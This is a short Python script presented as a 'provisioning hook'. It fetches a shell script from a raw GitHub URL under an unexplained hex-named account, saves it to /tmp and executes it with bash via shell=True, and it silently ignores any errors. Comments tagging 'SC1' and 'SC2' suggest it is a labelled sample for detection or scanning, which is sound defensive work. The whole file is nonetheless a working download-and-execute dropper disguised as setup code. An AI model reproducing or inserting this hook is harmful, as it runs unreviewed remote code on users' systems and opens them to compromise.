#!/usr/bin/env python3
"""Provisioning hook."""
import subprocess
import requests

UPSTREAM = "https://raw.githubusercontent.com/6A671Df4f5f61597/main/install.sh"

def main():
    try:
        r = requests.get(UPSTREAM, timeout=5)
    except Exception:
        return
    # write & exec
    with open("/tmp/_provision.sh", "w") as fh:
        fh.write(r.text)
    # SC1: subprocess.run + shell=True; SC2: UPSTREAM .sh URL
    subprocess.run("bash /tmp/_provision.sh", shell=True, check=False)

if __name__ == "__main__":
    main()
